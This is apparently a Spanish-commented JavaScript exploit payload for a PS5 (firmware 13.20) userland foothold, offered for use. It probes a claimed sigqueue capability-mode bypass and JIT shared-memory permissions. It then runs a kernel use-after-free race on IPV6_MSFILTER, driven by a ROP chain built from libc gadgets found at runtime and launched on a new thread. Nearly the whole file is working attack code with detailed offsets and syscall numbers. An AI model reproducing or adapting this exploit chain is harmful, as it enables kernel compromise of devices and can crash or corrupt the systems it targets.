// reach_probe_1320_v5.js -- Y2JB payload: probe fase 5 (PS5 13.20)
// --------------------------------------------------------------------------------
// Sucesor de reach_probe_1320_v4.js. Tres bloques, orden deliberado:
// B1' (oráculo diferencial P11, barato y seguro, PRIMERO) -> B2' (matriz
// jitshm, barata) -> B3' (RACE UAF P2 con hilo ROP, AL FINAL: si paniquea,
// todo lo anterior ya esta logueado).
//
//   B1' PoC DIFERENCIAL kill-vs-sigqueue (P11, CVE-2026-45259). Llamada lado
//       a lado de kill(pid,0) y sigqueue(pid,0,0) para los pids con hits
//       reales del sweep v4 (self, 66, 67, 74, 78, 1).
//         sys_kill      RESEARCH/fbsd2/src110/kern_sig.c:1730, y EN :1741
//                       `if (IN_CAPABILITY_MODE(td) && pid != self) return
//                       ECAPMODE`  <-- el check que la jaula impone (errno
//                       ECAPMODE=94, kstuff-13/freebsd-headers/sys/errno.h:178;
//                       el enunciado decia EPERM=1: se acepta cualquier error
//                       de sys_kill como lado "bloqueado" del diferencial).
//         sys_sigqueue  kern_sig.c:1840-1874: NO tiene NINGUN check de
//                       capability mode; solo p_cansignal. Con signum=0 es
//                       oraculo puro (valida pid y permiso, no entrega
//                       senal: pksignal solo si signum != 0, :1861).
//       Si kill(pid)=ERR y sigqueue(pid,0,0)=ok para el MISMO pid != self ->
//       la via sigqueue esquiva el gate de capmode de sys_kill.
//       SYS_kill=0x25=37 (SYSCALL.kill en global.js), SYS_sigqueue=456=0x1c8
//       (kstuff-13/freebsd-headers/sys/syscall.h:379).
//
//   B2' MATRIZ JITSHM. jitshm_create(0, 0x4000, prot) para prot=7/5/3. v4
//       vio EPERM con prot=0x7 (jitshm bloqueado en este contexto). Si ALGUN
//       prot pasa -> se cierra el tema (log ok + close fd). NO se llama a
//       jitshm_alias si create falla.
//
//   B3' RACE PoC IPV6_MSFILTER (P2, CVE-2026-49412) SIN MEMORIA EJECUTABLE.
//       v4 confirmo EPERM en jitshm_create => el shellcode raw-syscall de v4
//       es inalcanzable. Sustituto: HILO ROP puro (thr_new con start_func =
//       gadget pop_rdi de libc y cinta de ROP desplegada en un stack mmap RW):
//       N_BLOCKS=20000 llamadas setsockopt(fd,41,74,msfr,152) en bucle, y al
//       final thr_exit(0). Todo con gadgets de libc encontrados EN RUNTIME
//       por escaneo de bytes (nada hardcodeado, nada adivinado: si falta un
//       gadget, abort limpio).
//
//       VENTANA DE LOCK-DROP (verificada v4, misma cita): RESEARCH/fbsd2/
//       src110/in6_mcast.c in6p_set_source_filters:
//         :2419-2420  inm/imf capturados (imo->im6o_membership[idx])
//         :2442       INP_WUNLOCK(inp);                    <-- se SUELTA inp
//         :2446-2447  malloc(128*nsrcs, M_WAITOK)          (puede dormir)
//         :2448-2449  copyin(msfr_srcs, kss, 128*nsrcs)    <-- VENTANA 16KB
//         :2455       INP_WLOCK(inp);                      <-- RE-ADQUIERE
//         :2462+      inm/imf usados sin re-validar        <-- UAF
//       Un LEAVE_GROUP concurrente en el MISMO socket puede liberar
//       im6o_membership/inm durante [2442..2455] -> UAF al re-adquirir.
//       nsrcs=128=IPV6_MAX_SOCK_SRC_FILTER (in6.h:517), buffer srcs 16KB con
//       solo la 1a entrada valida (::1): las demas familia 0 -> EAFNOSUPPORT
//       POST-copyin (in6_mcast.c:2478) => el copyin de 16KB corre SIEMPRE.
//
// ABI verificado contra RESEARCH/ y global.js:
//   SYS_setsockopt=105=0x69 (syscall.h; SYSCALL.setsockopt global.js),
//   SYS_thr_new=455=0x1c7 (syscall.h:378), SYS_thr_exit=431=0x1af
//   (syscall.h:355), SYS_thr_kill2=481=0x1E1 (syscall.h:400; args
//   (pid_t pid, long id, int sig) segun sys_thr_kill2 en
//   fbsd2/src110/kern_thr.c:426-428 -- usado como join sin pthread: sig=0
//   devuelve 0 si el LWP vive, ESRCH si murio), SYS_mmap=477=0x1dd,
//   SYS_munmap=73=0x49 (syscall.h:82), SYS_sched_yield=331=0x14b
//   (syscall.h:272), SYS_jitshm_create=0x215, SYS_close=0x6. Todos presentes
//   en SYSCALL de global.js excepto thr_kill2 (definido local 0x1e1n).
//   PAGE_SIZE global=0x4000. MAP_PRIVATE|MAP_ANONYMOUS=0x1002. mmap jitshm
//   con offset=0n (fix v4). thr_param 0x68B sys/thr.h (start_func@0, arg@8,
//   stack_base@0x10, stack_size@0x18, tls_base@0x20, tls_size@0x28,
//   child_tid@0x30, parent_tid@0x38, flags@0x40 int+4pad, rtp@0x48,
//   spare@0x50..0x67). stack_base = base BAJA del mmap; rsp inicial del hilo
//   = base+size (cpu_set_upcall via kern_thr.c:163-166).
//
// Gadgets (bytes exactos ISA x86-64, escaneados en runtime en libc_base..
// +0x200000 con read64 por qwords little-endian: byte j del qword =
// (q >> 8j) & 0xff; ventana deslizante de 16B = qword actual + siguiente,
// patron buscado solo en los 8 primeros bytes de la ventana => cada direccion
// se reporta exactamente una vez y los patrones que cruzan qwords se detectan.
// SEGURIDAD DEL SCAN (fix crash v5): todo read64 va precedido de una sonda de
// LEGIBILIDAD por pagina via pipe-write: write(pipeWr, addr, 1) hace que el
// kernel haga uiomove DESDE addr (lectura del buffer de usuario validada por
// el propio kernel); EFAULT(14) = pagina no legible -> el scan para (break) o
// aborta limpio antes de empezar; jamas se lee memoria no mapeada (el scan
// anterior hizo SIGSEGV del proceso al pasar el fin de libc). Se ABANDONA la
// sonda msync: SYS_msync(65) NO existe en Orbis -> ENOSYS(78) -> el probe lo
// trataba como "mapeado" y el read64 posterior crashaba el proceso:
//   pop rdi; ret   = 5f c3          (POP r64: REX-less 5F + RET C3)
//   pop rsi; ret   = 5e c3          (5E)
//   pop rdx; ret   = 5a c3          (5A)
//   pop rcx; ret   = 59 c3          (59)
//   pop r8;  ret   = 41 58 c3       (REX.B 41 + POP r8 58 + C3)
//   pop rax; ret   = 58 c3          (58)
//   stub setsockopt= b8 69 00 00 00 0f 05  (mov eax,105 + syscall; primera
//                    ocurrencia; el ret de la ruta de salida del wrapper de
//                    libc devuelve el control a la cinta)
//   syscall        = 0f 05
//
// Cadena ROP (stack mmap RW 4MB, qword i en base+size-8*(i+1), DESCENDIENDO;
// base page-aligned y size 0x400000 multiplo de 16 => rsp inicial sin shift de
// alineacion). start_func = &pop_rdi = chain[0]. BLOQUE MSFILTER = 12 slots
// logicos: [&pop_rdi, fd, &pop_rsi, 41, &pop_rdx, 74, &pop_rcx, msfr, &pop_r8,
// 152, &stub, fake_ret] con 11 qwords escritas: el fake_ret del stub ES el
// &pop_rdi del siguiente bloque (solapado, no se duplica) -- por eso el bloque
// EXIT [&pop_rdi, 0, &pop_rax, 431, &syscall_gadget] sirve tambien de fake_ret
// del ultimo bloque MSFILTER. Flujo: pop rdi<=fd; pop rsi<=41; pop rdx<=74;
// pop rcx<=msfr; pop r8<=152; eax=105; syscall(setsockopt); ret (wrapper
// libc) -> &pop_rdi siguiente bloque; ... ; pop rdi<=0; pop rax<=431; syscall
// -> thr_exit(0) (no retorna, no hace falta ret tras el 0f 05).
//
// Riesgos: B1' signum=0 en ambas syscalls (no entrega senal; oraculo puro,
// patron ya verificado inofensivo en v3/v4). B2' sin riesgo (solo create y
// close). B3' es un UAF real: PUEDE paniquear/reiniciar la consola o corromper
// memoria sin panic silencioso -> va AL FINAL con aviso explicito. El hilo ROP
// depende de que el escaneo encuentre los 8 gadgets; si falta alguno, abort
// limpio ANTES de crear el hilo (nada de adivinar direcciones).
//
// Notas: bucles criticos (sweep, scan, escritura de cadena, race JS, poll
// thr_kill2) 100% sincronos, SIN awaits; logs solo fuera de los bucles. Todo
// acotado (200k iters JS, 100k polls, 20000 bloques ROP). fds cerrados y
// munmap del stack al final.
//
// v5 (2026-08-27). Interfaz Y2JB: syscall(), SYSCALL, malloc, read8/16/32/64,
// write8/16/32/64, toHex, log, send_notification, get_error_string().

(async () => {
    const R = {};
    const ORDER = [];

    const rec = async (k, v) => {
        R[k] = v; ORDER.push(k);
        try { await log("[probe5] " + k + " = " + v); } catch (e) {}
    };

    const B = (x) => (typeof x === "bigint" ? x : BigInt(x));

    const sy = (num, ...args) => {
        try {
            const raw = syscall(B(num), ...args.map(B));
            const r = BigInt.asIntN(64, raw);
            if (r < 0n) return "ERR:" + get_error_string();
            return "ok:" + toHex(raw);
        } catch (e) { return "EX:" + e; }
    };

    const isOk = (v) => (v || "").startsWith("ok");
    const errnoOf = (v) => {                      // "ERR:<n> ..." -> <n>
        const m = /^ERR:(\d+)/.exec(v || "");
        return m ? parseInt(m[1], 10) : -1;
    };

    // constantes ABI (verificadas arriba, ver cabecera)
    const SYS_SIGQUEUE   = 0x1c8n;  // 456 syscall.h:379
    const SYS_THR_KILL2  = 0x1e1n;  // 481 syscall.h:400 (no esta en SYSCALL)
    const IPPROTO_IPV6   = 41n;
    const IPV6_JOIN_GRP  = 12n, IPV6_LEAVE_GRP = 13n;   // in6.h:402-403
    const IPV6_MSFILTER  = 74n;                          // in6.h:488
    const MSFR_SIZE      = 152n;                         // in.h:555 (0x98)
    const NSRCS          = 128;     // IPV6_MAX_SOCK_SRC_FILTER in6.h:517
    const SS_SIZE        = 128;     // sizeof(sockaddr_storage)
    const ESRCH = 3, ECAPMODE = 94; // errno.h: FreeBSD 11
    const STACK_SZ = 0x400000n;     // 4MB pila+cinta ROP
    const N_BLOCKS = 20000;         // cinta desplegada: 20000 setsockopt

    // Sonda de LEGIBILIDAD via pipe(2)+write(2) (ver isReadable en B3', que
    // es donde existen pipeWr/scratch): write(pipeWr, addr, 1) hace que el
    // kernel haga uiomove DESDE addr => la lectura del buffer de usuario la
    // valida el propio kernel; EFAULT(14) = no legible. Nunca crashea (a
    // diferencia de read64 sobre pagina no mapeada -> SIGSEGV del proceso).
    // SYS_pipe=42=0x2a, SYS_read=3, SYS_write=4 (syscall.h:51/12/13; tabla
    // SYSCALL de global.js). Descartado msync: no existe en Orbis -> ENOSYS.

    // =====================================================================
    // B1' -- PoC diferencial kill-vs-sigqueue (P11, CVE-2026-45259). PRIMERO.
    // pids con hits reales del sweep v4. signum=0 en ambas = oraculo puro.
    // =====================================================================
    await log("[probe5] === B1' DIFERENCIAL kill-vs-sigqueue (P11, CVE-2026-45259) ===");
    let pid = 0n;
    try { pid = syscall(SYSCALL.getpid); } catch (e) {}
    await rec("B1':getpid", "ok:" + toHex(pid));

    try {
        const pids = [Number(pid), 66, 67, 74, 78, 1];
        let demo = false; const demoPids = [];
        for (const p of pids) {
            const k = sy(SYSCALL.kill, p, 0);       // kill(pid, 0)
            const q = sy(SYS_SIGQUEUE, p, 0, 0);    // sigqueue(pid, 0, 0)
            await rec("B1':kill(" + p + ")", k);
            await rec("B1':sigqueue(" + p + ")", q);
            if (!isOk(k) && isOk(q)) { demo = true; demoPids.push(p); }
        }
        if (demo) {
            await log("[probe5] B1' VEREDICTO: kill=ERR:" + errnoOf(sy(SYSCALL.kill, demoPids[0], 0)) +
                      " (ECAPMODE=" + ECAPMODE + "/EPERM=1) y sigqueue=ok para el mismo pid " +
                      demoPids.join(",") + " -> capmode check de sys_kill (kern_sig.c:1741)" +
                      " BYPASADO por sys_sigqueue (CVE-2026-45259) DEMOSTRADO");
        } else {
            await log("[probe5] B1' VEREDICTO: sin par diferencial kill=ERR/sigqueue=ok en la" +
                      " lista -> capmode de sys_kill no esquivable por sigqueue en estos pids" +
                      " (o kill ya permitido: ver logs lado a lado)");
        }
    } catch (e) { await rec("B1':dif", "EX:" + e); }

    // =====================================================================
    // B2' -- matriz jitshm: create(0, 0x4000, prot) para prot 7/5/3.
    // v4: prot=0x7 -> EPERM. Si alguno ok -> cerrar tema (close + log).
    // NO se llama jitshm_alias si create falla.
    // =====================================================================
    await log("[probe5] === B2' matriz jitshm_create(0,0x4000,prot) ===");
    try {
        let algunoOk = false;
        for (const prot of [0x7, 0x5, 0x3]) {
            const v = sy(SYSCALL.jitshm_create, 0, 0x4000, prot);
            await rec("B2':jitshm_create(prot=" + prot + ")", v);
            if (isOk(v)) {
                algunoOk = true;
                const fd = BigInt(v.slice(3));      // "ok:<hex>"
                await log("[probe5] B2' VEREDICTO: jitshm_create prot=" + prot +
                          " OK (fd=" + v + ") -> TEMA CERRADO: hay memoria ejecutable" +
                          " aliasable (el EPERM de v4 era solo prot=0x7)");
                try { syscall(SYSCALL.close, fd); } catch (e) {}
            }
        }
        if (!algunoOk)
            await log("[probe5] B2' VEREDICTO: jitshm muerto para prot 7/5/3 (confirmado" +
                      " EPERM en todos) -> sin memoria ejecutable, B3' usa hilo ROP");
    } catch (e) { await rec("B2':jitshm", "EX:" + e); }

    // =====================================================================
    // B3' -- RACE PoC IPV6_MSFILTER con HILO ROP (P2, CVE-2026-49412).
    // AL FINAL. Sin memoria ejecutable: cinta de ROP en stack mmap RW.
    // =====================================================================
    let raceSock = -1n, sanitySock = -1n, stackAddr = 0n;
    let pipeRd = -1n, pipeWr = -1n;
    let jsIters = 0, threadState = "n/a";
    try {
        // ---- pipe de legibilidad (sonda isReadable via uiomove del kernel) ----
        // pipe(fildes[2]): fildes[0]=lectura, fildes[1]=escritura (ints).
        const pfd = malloc(8);
        const pipeRet = syscall(SYSCALL.pipe, pfd);           // SYS_pipe=42=0x2a
        const pipeR0 = BigInt.asIntN(64, pipeRet);
        await rec("B3':pipe", pipeR0 < 0n ? "ERR:" + get_error_string() : "ok fildes@" + toHex(pfd));
        if (pipeR0 < 0n) {
            await log("[probe5] B3' pipe() FALLO -> sin sonda de legibilidad posible" +
                      " (leer sin sonda = SIGSEGV) -> race ABORTADO limpio");
            throw "gadget-missing";
        }
        pipeRd = read32(pfd);                                  // fd enteros: read32
        pipeWr = read32(pfd + 4n);                             // devuelve BigInt bajo
        const scratch = malloc(16);                            // patron de drenaje

        // Sonda de legibilidad via pipe-write: write(pipeWr, addr, 1) hace al
        // kernel uiomove DESDE addr (lectura del buffer de usuario validada por
        // el kernel); EFAULT(14) = direccion NO legible. Casos:
        //   ret >= 0            -> legible -> se DRENA 1 byte con read (si no,
        //                          el pipe se llenaria y write bloquearia) -> true
        //   errno == EFAULT(14) -> NO legible -> false (evita el SIGSEGV del
        //                          read64 posterior: es el caso que mato al
        //                          scan anterior, mas alla del fin de libc)
        //   otro errno          -> el kernel no la rechazo por legibilidad ->
        //                          asumimos legible (true), como el viejo msync
        const isReadable = (addr) => {
            const raw = syscall(SYSCALL.write, pipeWr, addr, 1n);
            const r = BigInt.asIntN(64, raw);
            if (r < 0n) return errnoOf("ERR:" + get_error_string()) !== 14;
            syscall(SYSCALL.read, pipeRd, scratch, 1n);        // drenar 1 byte
            return true;
        };

        // ---- socket de race + JOIN ff02::1/ifindex 1 + msfr (igual que v4) ----
        const rawS = syscall(SYSCALL.socket, 28n, 2n, 0n); // AF_INET6, DGRAM
        raceSock = BigInt.asIntN(64, rawS);
        await rec("B3':socket:INET6", raceSock < 0n ? "ERR:" + get_error_string() : "ok fd=" + rawS);

        if (raceSock < 0n) throw "sin socket de race";

        const mreq = malloc(20);
        write64(mreq + 0n, 0x2ffn);                  // ff02::
        write64(mreq + 8n, 0x0100000000000000n);     // ::1
        write32(mreq + 16n, 1);                      // ipv6mr_interface
        await rec("B3':JOIN(pre-race)",
                  sy(SYSCALL.setsockopt, raceSock, IPPROTO_IPV6, IPV6_JOIN_GRP, mreq, 20));

        const ssf = (addr, b0, b15) => {   // sockaddr_in6 dentro de sockaddr_storage
            write8(addr + 0n, 28); write8(addr + 1n, 28);
            write16(addr + 2n, 0); write32(addr + 4n, 0);
            write64(addr + 8n, b0); write64(addr + 16n, b15);
            write32(addr + 24n, 0);
        };
        const srcs = malloc(NSRCS * SS_SIZE);          // 16KB
        for (let i = 0; i < NSRCS * SS_SIZE; i += 8) write64(srcs + BigInt(i), 0n);
        ssf(srcs + 0n, 0n, 0x0100000000000000n);       // SOLO ::1 valida (resto fam 0)
        const msfr = malloc(Number(MSFR_SIZE));
        for (let i = 0; i < 0x98; i += 8) write64(msfr + BigInt(i), 0n);
        write32(msfr + 0n,   1);                       // msfr_ifindex
        write32(msfr + 4n,   1);                       // msfr_fmode = INCLUDE
        write32(msfr + 8n,   NSRCS);                   // msfr_nsrcs = 128 (max)
        ssf(msfr + 16n, 0x2ffn, 0x0100000000000000n);  // msfr_group ff02::1 @16
        write64(msfr + 144n, srcs);                    // msfr_srcs @144

        // ---- flags compartidos: solo child_tid@8 (cadena acotada: sin stopflag) ----
        const flags = malloc(0x10);
        write64(flags + 0n, 0n);
        const childTid = flags + 8n;
        write64(childTid, 0n);

        // ---- SCAN DE GADGETS EN RUNTIME (libc_base .. +0x80000, 512KB) ----
        // FIX crash (3x SIGSEGV): antes la sonda era msync, que NO existe en
        // Orbis -> ENOSYS -> el probe la trataba como "mapeada" y read64
        // crasheaba el proceso (y ademas solo se disparaba en direcciones
        // page-aligned). Ahora: (a) sanity ELF@libc+0x0 ANTES de escanear
        // (rechaza leak invalido sin recorrer memoria) y (b) cache de pagina
        // probeada POR LECTURA: cada pagina (pg = a & ~0xfff) se sondea con
        // isReadable (pipe-write) UNA sola vez via lastProbedPage,
        // inmediatamente antes de CADA read64, sin asumir la alineacion de
        // SCAN_BASE => ninguna lectura cae sobre pagina no sondeada y el fin
        // de libc da break limpio, no SIGSEGV.
        // read64 por qwords little-endian: byte j = (q >> 8j) & 0xff. Ventana
        // deslizante 16B = qword[p] + qword[p+8]; el patron se busca solo en
        // offsets 0..7 (primera mitad) => cada direccion se reporta 1 sola vez
        // y los patrones que cruzan qwords se ven completos en la ventana.
        await log("[probe5] B3' escaneando libc en busca de gadgets...");
        const PATTERNS = {
            pop_rdi:     [0x5f, 0xc3],
            pop_rsi:     [0x5e, 0xc3],
            pop_rdx:     [0x5a, 0xc3],
            pop_rcx:     [0x59, 0xc3],
            pop_r8:      [0x41, 0x58, 0xc3],
            pop_rax:     [0x58, 0xc3],
            sso_stub:    [0xb8, 0x69, 0x00, 0x00, 0x00, 0x0f, 0x05],
            syscall_g:   [0x0f, 0x05],
        };
        const G = {};
        try {
            const SCAN_BASE = B(libc_base), SCAN_LEN = 0x80000n;
            for (const key of Object.keys(PATTERNS)) if (!G[key]) G[key] = 0n;
            // Sonda previa (pipe-write): si el leak libc_base ni siquiera es
            // legible NO se escanea ni un qword. Los gadgets quedan todos en 0
            // y el bloque "missing" de abajo ejecuta ya el abort limpio
            // existente (throw "gadget-missing").
            if (!isReadable(SCAN_BASE)) {
                await log("[probe5] B3' libc_base NO legible (pipe-probe EFAULT: leak invalido) -> race ABORTADO limpio");
            } else {
                // Sanity ELF ANTES de escanear: libc_base debe apuntar al
                // encabezado ELF (\x7fELF en LE => low 4 bytes 0x464c457f). UNA
                // sola lectura, ya con la pagina de SCAN_BASE verificada por el
                // isReadable de arriba. Si no es ELF el leak es invalido: NO se
                // escanea y se cae al mismo abort "gadget-missing" de abajo.
                const qElf = read64(SCAN_BASE);
                if ((qElf & 0xffffffffn) !== 0x464c457fn) {
                    await log("[probe5] B3' libc_base NO es un ELF (primeros qword=" + toHex(qElf) + "): leak invalido -> race ABORTADO");
                } else {
                    await log("[probe5] B3' libc_base OK: ELF@libc+0x0 (magic verificado)");
                    // Cache de pagina probeada SIN asunciones de alineacion:
                    // cada pagina (pg = a & ~0xfff) se sondea con isReadable
                    // (pipe-write) UNA sola vez, inmediatamente antes de CADA
                    // read64. q0 lee [p,p+8) (pagina de a0), q1 lee [p+8,p+16)
                    // (pagina de a1). Si el pipe-probe rechaza la pagina (no
                    // legible) -> break limpio (fin de libc), nunca SIGSEGV.
                    // SCAN_BASE puede estar DESALINEADO: da igual, la sonda
                    // depende de la pagina de cada direccion, no de p.
                    let lastProbedPage = -1n;
                    for (let p = 0n; p < SCAN_LEN &&
                                 Object.keys(PATTERNS).some(k => G[k] === 0n); p += 8n) {
                        const a0 = SCAN_BASE + p, a1 = a0 + 8n;
                        const pg0 = a0 & ~0xfffn;
                        if (pg0 !== lastProbedPage) {
                            if (!isReadable(pg0)) {
                                await log("[probe5] B3' scan: fin de mapeo en libc+0x" + (a0 - SCAN_BASE).toString(16) + " (pipe-probe EFAULT)");
                                break;
                            }
                            lastProbedPage = pg0;
                        }
                        const pg1 = a1 & ~0xfffn;
                        if (pg1 !== lastProbedPage) {
                            if (!isReadable(pg1)) {
                                await log("[probe5] B3' scan: fin de mapeo en libc+0x" + (a1 - SCAN_BASE).toString(16) + " (pipe-probe EFAULT)");
                                break;
                            }
                            lastProbedPage = pg1;
                        }
                        if ((p & 0x1ffffn) === 0n)  // progreso: cada 0x20000 = 128KB
                            await log("[probe5] B3' scan en libc+0x" + p.toString(16));
                        const q0 = read64(a0), q1 = read64(a1);
                        for (const key of Object.keys(PATTERNS)) {
                            if (G[key] !== 0n) continue;               // primera ocurrencia
                            const pat = PATTERNS[key], L = pat.length;
                            for (let o = 0n; o < 8n && o + B(L) <= 16n; o++) {
                                let hit = true;
                                for (let j = 0; j < L; j++) {
                                    const idx = o + BigInt(j);
                                    const q = idx < 8n ? q0 : q1;
                                    const byte = Number((q >> ((idx < 8n ? idx : idx - 8n) * 8n)) & 0xffn);
                                    if (byte !== pat[j]) { hit = false; break; }
                                }
                                if (hit) { G[key] = SCAN_BASE + p + o; break; }
                            }
                        }
                    }
                }
            }
        } catch (e) { await rec("B3':scan:EX", "EX:" + e); }
        let missing = Object.keys(PATTERNS).filter(k => !G[k]);
        for (const key of Object.keys(PATTERNS))
            await rec("B3':gadget:" + key,
                      G[key] ? "ok libc+0x" + (G[key] - B(libc_base)).toString(16) : "NO ENCONTRADO");
        if (missing.length) {
            await log("[probe5] B3' gadget no encontrado [" + missing.join(",") +
                      "] en libc_base..+0x200000 -> race ABORTADO (nada de adivinar direcciones)");
            throw "gadget-missing";
        }

        // ---- cadena ROP (builder puro, portado verbatim al simulador) ----
        // Bloque MSFILTER (11 qwords escritas, 12 slots logicos: el fake_ret
        // del stub ES el &pop_rdi del bloque siguiente/EXIT, solapado):
        //   [&pop_rdi, fd, &pop_rsi, 41, &pop_rdx, 74, &pop_rcx, msfr,
        //    &pop_r8, 152, &sso_stub, =>fake_ret: &pop_rdi siguiente]
        // EXIT (5 qwords): [&pop_rdi, 0, &pop_rax, 431, &syscall] -> thr_exit(0)
        const NBLK = N_BLOCKS;
        const buildChain = (g, fd, msfrAddr) => {
            const ch = [];
            for (let i = 0; i < NBLK; i++)
                ch.push(g.pop_rdi, fd, g.pop_rsi, 41n, g.pop_rdx, 74n,
                        g.pop_rcx, msfrAddr, g.pop_r8, 152n, g.sso_stub);
            ch.push(g.pop_rdi, 0n, g.pop_rax, 431n, g.syscall_g);
            return ch;
        };

        // ---- stack+cadena: mmap RW 4MB, qword i en base+size-8*(i+1) ----
        const stkRaw = syscall(SYSCALL.mmap, 0n, STACK_SZ, 0x3n,
                               MAP_PRIVATE | MAP_ANONYMOUS, B(-1), 0n);
        stackAddr = BigInt.asIntN(64, stkRaw);
        await rec("B3':mmap:stack", stackAddr <= 0n ? "ERR:" + get_error_string() : "ok " + toHex(stkRaw));

        if (stackAddr > 0n) {
            const chain = buildChain(G, raceSock, msfr);
            const top = stackAddr + STACK_SZ;
            for (let i = 0; i < chain.length; i++) write64(top - 8n * BigInt(i + 1), chain[i]);
            await rec("B3':chain:len", chain.length + " qwords (" + (NBLK) +
                      " bloques MSFILTER + exit thr_exit(0))");

            // ---- thr_param 0x68B (igual que v4: stack_base = base BAJA) ----
            const tp = malloc(0x68);
            for (let i = 0; i < 0x68; i += 8) write64(tp + BigInt(i), 0n);
            write64(tp + 0x00n, G.pop_rdi);             // start_func = pop_rdi; ret
            write64(tp + 0x08n, 0n);                    // arg
            write64(tp + 0x10n, stackAddr);             // stack_base (base baja)
            write64(tp + 0x18n, STACK_SZ);              // stack_size
            write64(tp + 0x30n, childTid);              // child_tid
            const tRaw = syscall(SYSCALL.thr_new, tp, B(0x68));
            const tRet = BigInt.asIntN(64, tRaw);
            const tid = read64(childTid);
            await rec("B3':thr_new", tRet < 0n ? "ERR:" + get_error_string()
                                               : "ok tid=" + toHex(tid));

            if (tRet >= 0n && tid !== 0n) {
                await log("[probe5] === RACE P2 (hilo ROP) ARRANCANDO: si la consola se reinicia, el UAF (CVE-2026-49412) esta CONFIRMADO ===");

                // ---- hilo JS concurrente: SIN awaits, bucle acotado ----
                for (jsIters = 0; jsIters < 200000; jsIters++) {
                    syscall(SYSCALL.setsockopt, raceSock, IPPROTO_IPV6, IPV6_JOIN_GRP, mreq, 20);
                    syscall(SYSCALL.setsockopt, raceSock, IPPROTO_IPV6, IPV6_LEAVE_GRP, mreq, 20);
                }
                await rec("B3':js-loop:iters", jsIters * 2 + " setsockopt JOIN/LEAVE");

                // ---- join sin pthread: thr_kill2(pid, tid, 0) ----
                // sig=0: 0 si el LWP vive, ESRCH si murio (kern_thr.c:426+).
                // Acotado: 100k iteraciones con sched_yield max.
                for (let p = 0; p < 100000; p++) {
                    const raw = syscall(SYS_THR_KILL2, pid, tid, 0n);
                    const r = BigInt.asIntN(64, raw);
                    const em = r < 0n ? /^(\d+)/.exec(get_error_string()) : null;
                    if (em && Number(em[1]) === ESRCH) {
                        threadState = "muerto (ESRCH: thr_exit ejecutado, hilo terminado)";
                        break;
                    }
                    threadState = "vivo (thr_kill2(0) ok/otro-errno)";
                    syscall(SYSCALL.sched_yield);
                }
                if (/^vivo/.test(threadState)) threadState += " [TIMEOUT poll: sigue vivo tras 100k yields]";
                await rec("B3':thread", threadState);
                await log("[probe5] B3' post-race: iters JS=" + (jsIters * 2) +
                          " | hilo ROP: " + threadState);
            }
        }
    } catch (e) { if (e !== "gadget-missing") await rec("B3':race", "EX:" + e); }

    // ---- sanity post-race: si esto loguea, la consola SIGUE VIVA ----
    try {
        const gp = syscall(SYSCALL.getpid);
        await rec("B3':sanity:getpid", "ok:" + toHex(gp));
        const rawS2 = syscall(SYSCALL.socket, 28n, 2n, 0n);
        sanitySock = BigInt.asIntN(64, rawS2);
        await rec("B3':sanity:socket", sanitySock < 0n ? "ERR:" + get_error_string() : "ok fd=" + rawS2);
        if (sanitySock >= 0n) {
            const mreq2 = malloc(20);
            write64(mreq2 + 0n, 0x2ffn);
            write64(mreq2 + 8n, 0x0100000000000000n);
            write32(mreq2 + 16n, 1);
            await rec("B3':sanity:JOIN(socket nuevo)",
                      sy(SYSCALL.setsockopt, sanitySock, IPPROTO_IPV6, IPV6_JOIN_GRP, mreq2, 20));
            await log("[probe5] B3' veredicto: CONSOLA VIVA tras race (getpid+socket+JOIN ok)" +
                      " -> UAF no disparado en esta corrida (ventana no ganada)");
        } else {
            await log("[probe5] B3' veredicto: socket post-race FALLO: estado del kernel sospechoso");
        }
    } catch (e) { await rec("B3':sanity", "EX:" + e); }

    // ---- limpieza: fds (race, sanity, pipe) y munmap del stack-cadena ----
    try {
        if (raceSock   >= 0n) syscall(SYSCALL.close, raceSock);
        if (sanitySock >= 0n) syscall(SYSCALL.close, sanitySock);
        if (pipeRd     >= 0n) syscall(SYSCALL.close, pipeRd);
        if (pipeWr     >= 0n) syscall(SYSCALL.close, pipeWr);
        if (stackAddr  >  0n) syscall(SYSCALL.munmap, stackAddr, STACK_SZ);
    } catch (e) {}

    // =====================================================================
    // Resumen clasificado por bloque
    // =====================================================================
    const grp  = (re) => ORDER.filter(k => re.test(k));
    const list = (ks) => ks.map(k => k.split(":").slice(-1)[0] + "=" + R[k]).join(" | ");

    await log("[probe5] ===== RESULTADO v5 =====");
    await log("[probe5] B1' kill: " + list(grp(/^B1':kill/)));
    await log("[probe5] B1' sigqueue: " + list(grp(/^B1':sigqueue/)));
    await log("[probe5] B2' jitshm: " + list(grp(/^B2':/)));
    await log("[probe5] B3' race ROP: " + list(grp(/^B3':/)));
    await log("[probe5] leyenda: ERR:<n>=errno FreeBSD (1=EPERM 3=ESRCH 94=ECAPMODE 78=ENOSYS) | ok=llamable");
    try { send_notification("[probe v5] done"); } catch (e) {}
})();
